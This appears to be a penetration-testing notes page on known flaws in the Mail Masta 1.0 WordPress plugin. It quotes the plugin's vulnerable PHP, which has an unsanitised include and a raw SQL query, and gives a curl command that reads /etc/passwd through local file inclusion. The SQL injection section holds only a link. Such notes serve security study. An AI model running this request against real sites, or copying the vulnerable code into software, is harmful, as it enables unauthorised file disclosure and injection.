---
icon: wordpress
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# Plugin mail-masta 1.0

## Local File Inclusion

{% hint style="info" %}
## Exploit DB

[https://www.exploit-db.com/exploits/50226](https://www.exploit-db.com/exploits/50226)
{% endhint %}

"WordPress Plugin Mail Masta is prone to a local file inclusion vulnerability because it fails to sufficiently verify user-supplied input."

### Vulnerable Code

{% code overflow="wrap" lineNumbers="true" %}
```php
<?php 

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```
{% endcode %}

As we can see, the `pl` parameter allows us to include a file without any type of input validation or sanitisation. Using this, we can include arbitrary files on the web server. Let's exploit this to retrieve the contents of the `/etc/passwd` file using `cURL`.

### Example Exploitation

{% code title="Command" overflow="wrap" %}
```bash
curl -s http://blog.acme.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
{% endcode %}

## SQL Injection

{% hint style="info" %}
## Exploit DB

[https://www.exploit-db.com/exploits/41438](https://www.exploit-db.com/exploits/41438)
{% endhint %}
